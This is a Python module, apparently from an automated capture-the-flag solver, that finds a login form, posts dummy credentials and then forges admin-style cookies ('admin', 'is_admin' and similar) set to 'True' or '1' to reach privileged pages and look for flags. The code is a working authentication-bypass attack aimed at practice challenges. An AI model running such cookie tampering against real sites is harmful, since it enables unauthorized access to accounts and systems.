from unit import BaseUnit
from collections import Counter
import sys
from io import StringIO
import argparse
from pwn import *
import subprocess
import os
import units.raw
import re
import units.web
import requests
import magic
import units

potential_username_variables = [
			'username', 'user', 'uname', 'un', 'name', 'user1', 'input1', 'uw1', 'username1', 'uname1', 'tbUsername', 'usern', 'id'
]
potential_password_variables = [
	'password', 'pass', 'pword', 'pw', 'pass1', 'input2', 'password1', 'pw1', 'pword1', 'tbPassword'
]

user_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(potential_username_variables)
pass_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(potential_password_variables)

potential_cookie_names = [ 'admin', 'is_admin', 'isadmin', 'administrator', 'isAdmin' ]



class Unit(units.web.WebUnit):

	def __init__(self, katana, parent, target):

		# Run the parent constructor, to ensure this is a valid URL
		super(Unit, self).__init__(katana, parent, target)
		if not katana.config['flag_format']:
			raise units.NotApplicable

		try:
			self.response = requests.get(self.target)
		except requests.exceptions.ConnectionError:
			raise units.NotApplicable

		self.action = re.findall(r"<\s*form.*action\s*=\s*['\"](.+?)['\"]", self.response.text, flags=re.IGNORECASE)
		self.method = re.findall(r"<\s*form.*method\s*=\s*['\"](.+?)['\"]", self.response.text, flags=re.IGNORECASE)

		self.username = re.findall(user_regex, self.response.text, flags=re.IGNORECASE)
		self.password = re.findall(pass_regex, self.response.text, flags=re.IGNORECASE)
		
		# Only run this if we have potential information...
		if not (self.action and self.method and self.username and self.password):
			raise units.NotApplicable

	def evaluate(self, katana, case):
		
		if self.action and self.method and self.username and self.password:
			if self.action: action = self.action[0]
			if self.method: method = self.method[0]
			if self.username: username = self.username[0]
			if self.password: password = self.password[0]

			s = requests.Session()
			try:
				r = s.request(method.lower(), self.target.rstrip('/') + '/' + action, data = { username: "anything", password : "anything"})
			except:
				# JOHN: Theoretically, if we find a valid method, this should not error...
				#       But if it does, we should see it.
				traceback.print_exc()
			
			# Check out the cookies. Flip them if they are boolean, look for flags.
			if s.cookies:
				for admin_cookie in potential_cookie_names:
					if admin_cookie in s.cookies.keys():
						if s.cookies[admin_cookie] == 'False':
							new = requests.get(r.url, cookies = { admin_cookie : 'True' })
							if katana.locate_flags(self, new.text): break
						else:
							new = requests.get(r.url, cookies = { admin_cookie : '1' })
							if katana.locate_flags(self, new.text): break
